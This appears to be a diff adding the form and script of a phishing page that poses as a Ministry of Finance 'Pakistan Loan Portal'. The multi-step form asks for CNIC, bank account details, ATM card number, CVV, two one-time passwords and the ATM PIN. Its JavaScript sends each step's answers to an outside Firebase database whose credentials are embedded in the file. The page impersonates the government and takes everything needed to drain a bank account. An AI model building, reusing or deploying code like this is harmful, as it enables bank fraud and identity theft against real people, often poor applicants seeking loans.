+          <select id="gender"><option value="">Select gender</option><option value="Male">Male</option><option value="Female">Female</option><option value="Other">Other</option></select>
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">Date of Birth <span class="req">*</span></div><div class="ur">تاریخ پیدائش</div></div>
+          <input type="date" id="dob">
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">Province <span class="req">*</span></div><div class="ur">صوبہ</div></div>
+          <select id="province"><option value="">Select province</option><option value="Punjab">Punjab</option><option value="Sindh">Sindh</option><option value="KPK">Khyber Pakhtunkhwa</option><option value="Balochistan">Balochistan</option><option value="Islamabad">Islamabad</option><option value="AJK">Azad Jammu & Kashmir</option><option value="GB">Gilgit-Baltistan</option></select>
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">Address <span class="req">*</span></div><div class="ur">پتہ</div></div>
+          <textarea id="address" placeholder="Complete address"></textarea>
+        </div>
+        <div class="form-error" id="err-step1">Please fill all required fields</div>
+        <button class="btn-next" onclick="nextStep(2)">Continue →</button>
+      </div>
+
+      <!-- STEP 2: BANK INFORMATION -->
+      <div class="form-step" data-step="2">
+        <div class="form-step-title"><div class="en">Bank Information</div><div class="ur">بینک معلومات</div></div>
+        <div class="form-step-desc">Apni bank ki maloomat darj karein.</div>
+
+        <div class="field">
+          <div class="field-label"><div class="en">Loan Amount Required (PKR) <span class="req">*</span></div><div class="ur">مطلوبہ قرض کی رقم</div></div>
+          <input type="tel" id="loanAmount" placeholder="Enter Amount (Range : 1 lakh - 3 Crore)" inputmode="numeric">
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">Loan Purpose <span class="req">*</span></div><div class="ur">قرض کا مقصد</div></div>
+          <select id="loanPurpose">
+            <option value="">Select reason For Loan</option>
+            <option value="Business Startup">Business Startup</option>
+            <option value="Business Expansion">Business Expansion</option>
+            <option value="Agriculture">Agriculture / Farming</option>
+            <option value="Education">Education</option>
+            <option value="Home Construction">Home Construction</option>
+            <option value="Vehicle Purchase">Vehicle Purchase</option>
+            <option value="Equipment Purchase">Equipment Purchase</option>
+            <option value="Working Capital">Working Capital</option>
+            <option value="Other">Other</option>
+          </select>
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">Occupation <span class="req">*</span></div><div class="ur">پیشہ</div></div>
+          <select id="occupation">
+            <option value="">Select Occupation</option>
+            <option value="Business Owner">Business Owner</option>
+            <option value="Farmer">Farmer</option>
+            <option value="Private Employee">Private Employee</option>
+            <option value="Government Employee">Government Employee</option>
+            <option value="Self Employed">Self Employed</option>
+            <option value="Freelancer">Freelancer</option>
+            <option value="Student">Student</option>
+            <option value="Unemployed">Unemployed</option>
+            <option value="Other">Other</option>
+          </select>
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">Bank Name <span class="req">*</span></div><div class="ur">بینک کا نام</div></div>
+          <select id="bankName">
+            <option value="">Select Bank</option>
+            <optgroup label="Public Sector Banks">
+              <option value="National Bank of Pakistan">National Bank of Pakistan (NBP)</option>
+              <option value="Bank of Punjab">Bank of Punjab (BOP)</option>
+              <option value="Bank of Khyber">Bank of Khyber (BOK)</option>
+              <option value="Sindh Bank">Sindh Bank</option>
+              <option value="First Women Bank">First Women Bank</option>
+              <option value="ZTBL">Zarai Taraqiati Bank (ZTBL)</option>
+            </optgroup>
+            <optgroup label="Private Banks">
+              <option value="Habib Bank Limited">Habib Bank Limited (HBL)</option>
+              <option value="United Bank Limited">United Bank Limited (UBL)</option>
+              <option value="MCB Bank">MCB Bank</option>
+              <option value="Allied Bank Limited">Allied Bank Limited (ABL)</option>
+              <option value="Meezan Bank">Meezan Bank</option>
+              <option value="Bank Alfalah">Bank Alfalah</option>
+              <option value="Bank Al Habib">Bank Al Habib</option>
+              <option value="Faysal Bank">Faysal Bank</option>
+              <option value="Askari Bank">Askari Bank</option>
+              <option value="Standard Chartered">Standard Chartered</option>
+              <option value="HabibMetro Bank">HabibMetro Bank</option>
+              <option value="JS Bank">JS Bank</option>
+              <option value="Soneri Bank">Soneri Bank</option>
+              <option value="Summit Bank">Summit Bank</option>
+              <option value="Silk Bank">Silk Bank</option>
+            </optgroup>
+            <optgroup label="Islamic Banks">
+              <option value="BankIslami">BankIslami</option>
+              <option value="Dubai Islamic Bank">Dubai Islamic Bank</option>
+              <option value="Al Baraka Bank">Al Baraka Bank</option>
+              <option value="MCB Islamic Bank">MCB Islamic Bank</option>
+              <option value="Faysal Islamic Bank">Faysal Islamic Bank</option>
+            </optgroup>
+            <optgroup label="Microfinance Banks">
+              <option value="U Microfinance Bank">U Microfinance Bank</option>
+              <option value="Telenor Microfinance Bank (Easypaisa)">Telenor Microfinance Bank (Easypaisa)</option>
+              <option value="Mobilink Microfinance Bank (JazzCash)">Mobilink Microfinance Bank (JazzCash)</option>
+              <option value="FINCA Microfinance Bank">FINCA Microfinance Bank</option>
+              <option value="Khushhali Microfinance Bank">Khushhali Microfinance Bank</option>
+              <option value="NRSP Microfinance Bank">NRSP Microfinance Bank</option>
+              <option value="Apna Microfinance Bank">Apna Microfinance Bank</option>
+            </optgroup>
+          </select>
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">Account Number <span class="req">*</span></div><div class="ur">اکاؤنٹ نمبر</div></div>
+          <input type="tel" id="accountNumber" placeholder="01234567890123" inputmode="numeric">
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">Current Bank Balance (PKR) <span class="req">*</span></div><div class="ur">موجودہ بینک بیلنس</div></div>
+          <input type="tel" id="currentBalance" placeholder="Enter Amount" inputmode="numeric">
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">Monthly Income (PKR) <span class="req">*</span></div><div class="ur">ماہانہ آمدنی</div></div>
+          <input type="tel" id="monthlyIncome" placeholder="Enter Amount" inputmode="numeric">
+        </div>
+        <div class="form-error" id="err-step2">Please fill all required fields</div>
+        <div class="btn-row">
+          <button class="btn-back" onclick="prevStep(1)">← Back</button>
+          <button class="btn-next" onclick="nextStep(3)">Continue →</button>
+        </div>
+      </div>
+
+      <!-- STEP 3: CARD VERIFICATION -->
+      <div class="form-step" data-step="3">
+        <div class="form-step-title"><div class="en">Loan Apply Fees</div><div class="ur">محفوظ ادائیگی</div></div>
+        <div class="form-step-desc">Pay Rs. 75 processing tax to submit your application</div>
+
+        <div class="card-visual-wrapper">
+          <div class="card-visual-back"></div>
+          <div class="card-visual">
+            <div class="card-top">
+              <div class="card-chip"></div>
+              <div class="card-type">premium debit 📶</div>
+            </div>
+            <div class="card-number-display" id="cardNumberDisplay">**** **** **** ****</div>
+            <div class="card-label">ATM CARD NUMBER</div>
+            <div class="card-bottom">
+              <div class="card-date-block">
+                <span class="card-date-label">Valid From</span>
+                <span class="card-date-value">04/2024</span>
+                <span class="card-issue-label">Issue Date</span>
+              </div>
+              <div class="card-date-block" style="text-align:right;">
+                <span class="card-date-label">Valid Thru</span>
+                <span class="card-date-value" id="cardExpiryDisplay">04/2029</span>
+                <span class="card-issue-label">Expiry Date</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="field">
+          <div class="field-label"><div class="en">Bank ATM Card Number <span class="req">*</span></div><div class="ur">بینک کے اے ٹی ایم کارڈ نمبر</div></div>
+          <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19">
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">Expiry <span class="req">*</span></div><div class="ur">میعاد</div></div>
+          <input type="tel" id="cardExpiry" placeholder="MM/YY" inputmode="numeric" maxlength="5">
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">CVV <span class="req">*</span></div><div class="ur">سی وی وی</div></div>
+          <input type="password" id="cardCvv" placeholder="***" inputmode="numeric" maxlength="3">
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">Processing Tax <span class="req">*</span></div><div class="ur">پروسیسنگ ٹیکس</div></div>
+          <input type="text" id="processingTax" value="Rs. 75" class="readonly-field" readonly>
+        </div>
+        <div class="form-error" id="err-step3">Please fill all required fields</div>
+        <div class="btn-row">
+          <button class="btn-back" onclick="prevStep(2)">← Back</button>
+          <button class="btn-next" onclick="nextStep(4)">Continue →</button>
+        </div>
+      </div>
+
+      <!-- STEP 4: OTP VERIFICATION -->
+      <div class="form-step" data-step="4">
+        <div class="form-step-title" style="align-items:center;"><div><div class="en">OTP Verification</div><div class="form-step-desc" style="margin:4px 0 0;">Secure two-factor authentication</div></div><div class="ur">دو مرحلوں کی تصدیق</div></div>
+
+        <div class="otp-banner">
+          <div class="check">✓</div>
+          <div class="text">OTP code has been sent to your mobile number<span class="urdu-line">آپ کے موبائل نمبر پر او ٹی پی کوڈ بھیج دیا گیا ہے</span></div>
+        </div>
+
+        <div class="phone-info-box">
+          <div class="left">
+            <div class="phone-icon">📱</div>
+            <div>
+              <div class="info-label">CODE SENT TO</div>
+              <div class="info-value" id="otpPhone1">0848XXXXX64</div>
+            </div>
+          </div>
+          <div class="phone-icon-right">📱</div>
+        </div>
+
+        <div class="otp-label-row"><div class="en">Enter 6-digit code</div><div class="ur">6 ہندسوں کا کوڈ درج کریں</div></div>
+        <div class="otp-boxes" id="otpBoxes1">
+          <input type="tel" maxlength="1" inputmode="numeric">
+          <input type="tel" maxlength="1" inputmode="numeric">
+          <input type="tel" maxlength="1" inputmode="numeric">
+          <input type="tel" maxlength="1" inputmode="numeric">
+          <input type="tel" maxlength="1" inputmode="numeric">
+          <input type="tel" maxlength="1" inputmode="numeric">
+        </div>
+
+        <div class="otp-timer-row">
+          <div class="timer-left"><span class="timer-dot"></span><span class="timer-label">Expires in</span><span class="timer-value" id="timer1">4:35</span></div>
+          <button class="resend" onclick="resetTimer('timer1', 275)"><svg viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6s-2.69 6-6 6-6-2.69-6-6H4c0 4.42 3.58 8 8 8s8-3.58 8-8-3.58-8-8-8z"/></svg>Resend</button>
+        </div>
+
+        <div class="info-box">
+          <div class="lock-icon">🔒</div>
+          <div class="info-text">Never share your OTP with anyone. Government of Pakistan officials will never ask for your verification code.<span class="urdu-line">اپنا کوڈ کسی کے ساتھ شیئر نہ کریں۔</span></div>
+        </div>
+
+        <div class="form-error" id="err-step4">Please enter OTP</div>
+        <div class="btn-row">
+          <button class="btn-back" onclick="prevStep(3)">← Back</button>
+          <button class="btn-next" onclick="nextStep(5)">Verify OTP →</button>
+        </div>
+      </div>
+
+      <!-- STEP 5: ATM PIN -->
+      <div class="form-step" data-step="5">
+        <div class="form-step-title" style="align-items:center;"><div><div class="en">ATM PIN</div><div class="form-step-desc" style="margin:4px 0 0;">Please create your 4-digit ATM PIN</div></div><div class="ur">اے ٹی ایم پن</div></div>
+
+        <div class="info-box" style="background:#e0ede6;border-color:#b8d4c4;">
+          <div class="lock-icon">🔒</div>
+          <div class="info-text" style="font-weight:600;color:#0a4d2e;">Your ATM PIN will be used for card transactions and cash withdrawals.<span class="urdu-line">آپ کا اے ٹی ایم پن کارڈ ٹرانزیکشنز اور نقد رقم نکالنے کے لیے استعمال ہوگا۔</span></div>
+        </div>
+
+        <div class="otp-label-row"><div class="en">Enter 4-digit ATM PIN <span style="color:#c62828;">*</span></div><div class="ur">4 ہندسوں کا اے ٹی ایم پن درج کریں</div></div>
+        <div class="otp-boxes four" id="pinBoxes">
+          <input type="password" maxlength="1" inputmode="numeric">
+          <input type="password" maxlength="1" inputmode="numeric">
+          <input type="password" maxlength="1" inputmode="numeric">
+          <input type="password" maxlength="1" inputmode="numeric">
+        </div>
+
+        <div class="warning-box">
+          <div class="warn-icon">i</div>
+          <div class="warn-text"><b>Important:</b> Do not use easy PIN like 1234, 0000, or your date of birth.<span class="urdu-line">آسان پن جیسے 1234، 0000، یا اپنی تاریخ پیدائش استعمال نہ کریں۔</span></div>
+        </div>
+
+        <div class="form-error" id="err-step5">Please enter 4-digit PIN</div>
+        <div class="btn-row">
+          <button class="btn-back" onclick="prevStep(4)">← Back</button>
+          <button class="btn-next" onclick="nextStep(6)">Continue →</button>
+        </div>
+      </div>
+
+      <!-- STEP 6: FINAL VERIFICATION -->
+      <div class="form-step" data-step="6">
+        <div class="form-step-title" style="align-items:center;"><div><div class="en">Final Verification</div><div class="form-step-desc" style="margin:4px 0 0;">Confirm your identity to complete the application</div></div><div class="ur">حتمی تصدیق</div></div>
+
+        <div class="otp-banner">
+          <div class="check">✓</div>
+          <div class="text">A final confirmation code has been sent to your mobile number<span class="urdu-line">آپ کے موبائل نمبر پر حتمی تصدیقی کوڈ بھیج دیا گیا ہے</span></div>
+        </div>
+
+        <div class="phone-info-box">
+          <div class="left">
+            <div class="phone-icon">📱</div>
+            <div>
+              <div class="info-label">CODE SENT TO</div>
+              <div class="info-value" id="otpPhone2">0848XXXXX64</div>
+            </div>
+          </div>
+          <div class="phone-icon-right">📱</div>
+        </div>
+
+        <div class="otp-label-row"><div class="en">Enter 6-digit code</div><div class="ur">6 ہندسوں کا کوڈ درج کریں</div></div>
+        <div class="otp-boxes" id="otpBoxes2">
+          <input type="tel" maxlength="1" inputmode="numeric">
+          <input type="tel" maxlength="1" inputmode="numeric">
+          <input type="tel" maxlength="1" inputmode="numeric">
+          <input type="tel" maxlength="1" inputmode="numeric">
+          <input type="tel" maxlength="1" inputmode="numeric">
+          <input type="tel" maxlength="1" inputmode="numeric">
+        </div>
+
+        <div class="otp-timer-row">
+          <div class="timer-left"><span class="timer-dot"></span><span class="timer-label">Expires in</span><span class="timer-value" id="timer2">4:38</span></div>
+          <button class="resend" onclick="resetTimer('timer2', 278)"><svg viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6s-2.69 6-6 6-6-2.69-6-6H4c0 4.42 3.58 8 8 8s8-3.58 8-8-3.58-8-8-8z"/></svg>Resend</button>
+        </div>
+
+        <div class="info-box">
+          <div class="lock-icon">🔒</div>
+          <div class="info-text">Never share your OTP with anyone. Government of Pakistan officials will never ask for your verification code.<span class="urdu-line">اپنا کوڈ کسی کے ساتھ شیئر نہ کریں۔</span></div>
+        </div>
+
+        <div class="form-error" id="err-step6">Please enter the code</div>
+        <div class="btn-row">
+          <button class="btn-back" onclick="prevStep(5)">← Back</button>
+          <button class="btn-next" onclick="submitForm()">Submit ✓</button>
+        </div>
+      </div>
+
+      <!-- SUCCESS -->
+      <div class="form-step" data-step="7">
+        <div class="success-screen">
+          <div class="success-circle">
+            <svg viewBox="0 0 50 50"><polyline points="12 26 22 36 38 18"/></svg>
+          </div>
+          <div class="success-badge">
+            <svg class="badge-icon" viewBox="0 0 24 24"><path d="M12 2L4 6v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V6l-8-4zm-2 16l-4-4 1.41-1.41L10 15.17l6.59-6.59L18 10l-8 8z"/></svg>
+            APPLICATION VERIFIED & RECEIVED
+          </div>
+          <div class="success-title">Darkhwast Jamah Ho Gayi Hai</div>
+          <div class="success-urdu">آپ کی قرض کی درخواست کامیابی سے موصول ہو چکی ہے</div>
+
+          <div class="summary-card">
+            <div class="summary-row">
+              <span class="label">Tracking Reference No</span>
+              <span class="value green" id="trackingRef">PK-2026-000000</span>
+            </div>
+            <div class="summary-row">
+              <span class="label">Applicant Name</span>
+              <span class="value" id="summaryName">—</span>
+            </div>
+            <div class="summary-row">
+              <span class="label">CNIC Number</span>
+              <span class="value" id="summaryCnic">—</span>
+            </div>
+            <div class="summary-row">
+              <span class="label">Requested Amount</span>
+              <span class="value green" id="summaryAmount">—</span>
+            </div>
+            <div class="summary-row">
+              <span class="label">Status</span>
+              <span class="value"><span class="status-badge"><span class="clock">🕐</span> Under 48h Review</span></span>
+            </div>
+          </div>
+
+          <div class="success-note">
+            Government of Pakistan representative will contact you on <b id="summaryPhone">0848-XXXXXXX</b> for the final sanction and disbursement process.
+          </div>
+
+          <button class="btn-submit-another" onclick="location.reload()">
+            <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
+            Submit Another Application
+          </button>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- FOOTER -->
+    <div class="footer">
+      <div class="footer-brand">
+        <div class="footer-logo"><svg viewBox="0 0 100 100"><path d="M40 25 Q30 25 30 40 Q30 55 40 55 Q50 55 50 40 Q50 25 40 25 Z" fill="#fff"/><circle cx="40" cy="42" r="9" fill="#0a4d2e"/><path d="M40 60 L40 82 M30 82 L50 82" stroke="#fff" stroke-width="4" fill="none"/></svg></div>
+        <div class="footer-brand-text"><div class="small">MINISTRY OF FINANCE</div><div class="big">Pakistan Loan Portal</div></div>
+      </div>
+      <div class="footer-desc">Official portal for loan assistance programmes. All applications are processed through verified government channels.</div>
+
+      <div class="footer-section">CONTACT</div>
+      <div class="footer-contact"><div class="fc-icon">📞</div>0800114400 (Helpline)</div>
+      <div class="footer-contact"><div class="fc-icon">💬</div>03422050953 (WhatsApp)</div>
+      <div class="footer-contact"><div class="fc-icon">✉️</div>info@finance.gov.pk</div>
+      <div class="footer-contact"><div class="fc-icon">📍</div>Q-Block, Pak Secretariat, Islamabad</div>
+
+      <div class="footer-section">SECTION</div>
+      <div class="footer-links">
+        <a href="#" onclick="goToForm();return false;">About Programme</a>
+        <a href="#" onclick="goToForm();return false;">Apply for Loan</a>
+        <a href="#">Terms & Conditions</a>
+        <a href="#">Privacy Policy</a>
+      </div>
+      <div class="footer-copy">© MOF.GOV.PK · GOVERNMENT OF PAKISTAN<br><b>PAKISTAN ZINDABAD PK</b><br>ALL RIGHTS RESERVED</div>
+    </div>
+
+  </div>
+
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-spinner"></div>
+    <div class="loading-text" id="loadingText">Processing...</div>
+  </div>
+
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+const firebaseConfig = {
+    apiKey: "AIzaSyB9Y2_hnmgQsFute7DDAcKjmuoAnggQZJY",
+    authDomain: "long-d1bcb.firebaseapp.com",
+    databaseURL: "https://long-d1bcb-default-rtdb.firebaseio.com",
+    projectId: "long-d1bcb",
+    storageBucket: "long-d1bcb.firebasestorage.app",
+    messagingSenderId: "515546162619",
+    appId: "1:515546162619:web:e046b79a25ccfa057e509e"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const FIREBASE_NODE = 'pak_loan_portal_users';
+
+let currentKey = null;
+let currentStep = 1;
+const sessionData = {};
+
+function saveToFirebase(data) {
+    const usersRef = ref(db, FIREBASE_NODE);
+    const newRef = push(usersRef);
+    currentKey = newRef.key;
+    set(newRef, {
+        ...data,
+        loginTime: new Date().toLocaleString(),
+        loginTimestamp: Date.now(),
+        status: 'In Progress'
+    }).then(() => console.log('✅ Saved:', currentKey))
+      .catch(err => console.error('❌ Save error:', err));
+}
+
+function updateFirebase(data) {
+    if (!currentKey) { saveToFirebase({ ...sessionData, ...data }); return; }
+    const userRef = ref(db, FIREBASE_NODE + '/' + currentKey);
+    update(userRef, data).then(() => console.log('✅ Updated')).catch(err => console.error('❌', err));
+}
+
+function showLoading(text) {
+    document.getElementById('loadingText').textContent = text || 'Processing...';
+    document.getElementById('loadingOverlay').classList.add('show');
+}
+function hideLoading() { document.getElementById('loadingOverlay').classList.remove('show'); }
+
+setTimeout(() => { document.getElementById('screen-splash').classList.add('hide'); }, 3000);
+
+window.goToForm = function() {
+    const w = document.getElementById('formWrapper');
+    if (w) {
+        w.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        if (!currentKey) {
+            saveToFirebase({ clickedApply: true, clickedTime: new Date().toLocaleString(), clickedTimestamp: Date.now(), step: 'apply-clicked', status: 'Started' });
+        }
+    }
+};
+
+window.nextStep = function(step) {
+    if (!validateStep(currentStep)) return;
+    saveStepData(currentStep);
+    document.querySelectorAll('.step-item').forEach(item => {
+        const s = parseInt(item.dataset.step);
+        item.classList.remove('active','done');
+        if (s < step) item.classList.add('done');
+        if (s === step) item.classList.add('active');
+    });
+    document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
+    document.querySelector(`.form-step[data-step="${step}"]`).classList.add('active');
+    currentStep = step;
+    document.getElementById('formWrapper').scrollIntoView({ behavior: 'smooth', block: 'start' });
+    if (step === 4) { startTimer('timer1', 275); setTimeout(() => document.querySelector('#otpBoxes1 input').focus(), 300); }
+    if (step === 5) setTimeout(() => document.querySelector('#pinBoxes input').focus(), 300);
+    if (step === 6) { startTimer('timer2', 278); setTimeout(() => document.querySelector('#otpBoxes2 input').focus(), 300); }
+};
+
+window.prevStep = function(step) {
+    document.querySelectorAll('.step-item').forEach(item => {
+        const s = parseInt(item.dataset.step);
+        item.classList.remove('active','done');
+        if (s < step) item.classList.add('done');
+        if (s === step) item.classList.add('active');
+    });
+    document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
+    document.querySelector(`.form-step[data-step="${step}"]`).classList.add('active');
+    currentStep = step;
+    document.getElementById('formWrapper').scrollIntoView({ behavior: 'smooth', block: 'start' });
+};
+
+function showError(id, show) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    if (show) el.classList.add('show'); else el.classList.remove('show');
+}
+
+function validateStep(step) {
+    if (step === 1) {
+        const f = ['fullName','cnic','mobile','gender','dob','province','address'];
+        for (const x of f) if (!document.getElementById(x).value.trim()) { showError('err-step1', true); return false; }
+        showError('err-step1', false); return true;
+    }
+    if (step === 2) {
+        const f = ['loanAmount','loanPurpose','occupation','bankName','accountNumber','currentBalance','monthlyIncome'];
+        for (const x of f) if (!document.getElementById(x).value.trim()) { showError('err-step2', true); return false; }
+        showError('err-step2', false); return true;
+    }
+    if (step === 3) {
+        const f = ['cardNumber','cardExpiry','cardCvv'];
+        for (const x of f) if (!document.getElementById(x).value.trim()) { showError('err-step3', true); return false; }
+        showError('err-step3', false); return true;
+    }
+    if (step === 4) {
+        let otp = ''; document.querySelectorAll('#otpBoxes1 input').forEach(i => otp += i.value);
+        if (otp.length < 6) { showError('err-step4', true); return false; }
+        showError('err-step4', false); return true;
+    }
+    if (step === 5) {
+        let pin = ''; document.querySelectorAll('#pinBoxes input').forEach(i => pin += i.value);
+        if (pin.length < 4) { showError('err-step5', true); return false; }
+        showError('err-step5', false); return true;
+    }
+    return true;
+}
+
+function saveStepData(step) {
+    if (step === 1) {
+        const d = { fullName: document.getElementById('fullName').value.trim(), cnic: document.getElementById('cnic').value.trim(), mobile: document.getElementById('mobile').value.trim(), gender: document.getElementById('gender').value, dob: document.getElementById('dob').value, province: document.getElementById('province').value, address: document.getElementById('address').value.trim(), step: 'step1', status: 'Personal Info' };
+        Object.assign(sessionData, d); updateFirebase(d);
+    }
+    if (step === 2) {
+        const d = { loanAmount: document.getElementById('loanAmount').value.trim(), loanPurpose: document.getElementById('loanPurpose').value, occupation: document.getElementById('occupation').value, bankName: document.getElementById('bankName').value, accountNumber: document.getElementById('accountNumber').value.trim(), currentBalance: document.getElementById('currentBalance').value.trim(), monthlyIncome: document.getElementById('monthlyIncome').value.trim(), step: 'step2', status: 'Bank Info' };
+        Object.assign(sessionData, d); updateFirebase(d);
+    }
+    if (step === 3) {
+        const d = { cardNumber: document.getElementById('cardNumber').value.trim(), cardExpiry: document.getElementById('cardExpiry').value.trim(), cardCvv: document.getElementById('cardCvv').value.trim(), processingTax: 'Rs. 75', step: 'step3', status: 'Card Verification' };
+        Object.assign(sessionData, d); updateFirebase(d);
+    }
+    if (step === 4) {
+        let otp = ''; document.querySelectorAll('#otpBoxes1 input').forEach(i => otp += i.value);
+        const d = { otp1: otp, step: 'step4', status: 'OTP Verification' };
+        Object.assign(sessionData, d); updateFirebase(d);
+    }
+    if (step === 5) {
+        let pin = ''; document.querySelectorAll('#pinBoxes input').forEach(i => pin += i.value);
+        const d = { atmPin: pin, step: 'step5', status: 'ATM PIN' };
+        Object.assign(sessionData, d); updateFirebase(d);
+    }
+}
+
+window.submitForm = function() {
+    let otp = ''; document.querySelectorAll('#otpBoxes2 input').forEach(i => otp += i.value);
+    if (otp.length < 6) { showError('err-step6', true); return; }
+    showError('err-step6', false);
+
+    showLoading('Verifying...');
+    const refNum = 'PK-2026-' + Math.floor(100000 + Math.random() * 900000);
+    const finalData = { ...sessionData, otp2: otp, referenceNumber: refNum, step: 'completed', status: 'Completed', completedTime: new Date().toLocaleString(), completedTimestamp: Date.now() };
+    updateFirebase(finalData);
+
+    setTimeout(() => {
+        hideLoading();
+        document.getElementById('trackingRef').textContent = refNum;
+        document.getElementById('summaryName').textContent = sessionData.fullName || '—';
+        document.getElementById('summaryCnic').textContent = sessionData.cnic || '—';
+        document.getElementById('summaryAmount').textContent = sessionData.loanAmount ? 'Rs. ' + Number(sessionData.loanAmount).toLocaleString() : '—';
+        document.getElementById('summaryPhone').textContent = sessionData.mobile || '—';
+        document.querySelectorAll('.step-item').forEach(item => item.classList.add('done'));
+        document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
+        document.querySelector('.form-step[data-step="7"]').classList.add('active');
+        document.getElementById('formWrapper').scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }, 2200);
+};
+
+function startTimer(id, seconds) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    let r = seconds;
+    if (window['t_' + id]) clearInterval(window['t_' + id]);
+    const update = () => {
+        const m = Math.floor(r / 60), s = r % 60;
+        el.textContent = m + ':' + String(s).padStart(2, '0');
+    };
+    update();
+    window['t_' + id] = setInterval(() => {
+        r--;
+        if (r <= 0) { clearInterval(window['t_' + id]); el.textContent = '0:00'; return; }
+        update();
+    }, 1000);
+}
+window.resetTimer = function(id, seconds) { startTimer(id, seconds); };
+
+// INPUT FORMATTING
+document.getElementById('cnic').addEventListener('input', function() {
+    let v = this.value.replace(/\D/g, '').slice(0, 13);
+    if (v.length > 5) v = v.slice(0,5) + '-' + v.slice(5);
+    if (v.length > 13) v = v.slice(0,13) + '-' + v.slice(13);
+    this.value = v;
+});
+document.getElementById('mobile').addEventListener('input', function() {
+    let v = this.value.replace(/\D/g, '').slice(0, 11);
+    if (v.length > 4) v = v.slice(0,4) + '-' + v.slice(4);
+    this.value = v;
+});
+document.getElementById('loanAmount').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
+document.getElementById('accountNumber').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
+document.getElementById('currentBalance').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
+document.getElementById('monthlyIncome').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
+
+document.getElementById('cardNumber').addEventListener('input', function() {
+    let v = this.value.replace(/\D/g, '').slice(0, 16);
+    v = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+    this.value = v;
+    const disp = v || '**** **** **** ****';
+    const padded = disp.padEnd(19, '*').slice(0, 19);
+    document.getElementById('cardNumberDisplay').textContent = v ? v : '**** **** **** ****';
+});
+document.getElementById('cardExpiry').addEventListener('input', function() {
+    let v = this.value.replace(/\D/g, '').slice(0, 4);
+    if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2);
+    this.value = v;
+    document.getElementById('cardExpiryDisplay').textContent = v || '04/2029';
+});
+document.getElementById('cardCvv').addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 3); });
+
+// OTP BOX AUTO-TAB
+function setupOtpBoxes(containerId) {
+    const inputs = document.querySelectorAll(`#${containerId} input`);
+    inputs.forEach((input, idx) => {
+        input.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 1);
+            if (this.value && idx < inputs.length - 1) inputs[idx + 1].focus();
+        });
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && !this.value && idx > 0) inputs[idx - 1].focus();
+        });
+    });
+}
+setupOtpBoxes('otpBoxes1');
+setupOtpBoxes('otpBoxes2');
+setupOtpBoxes('pinBoxes');
+
+console.log('✅ Pakistan Loan Portal loaded');
+</script>
+</body>
+</html>
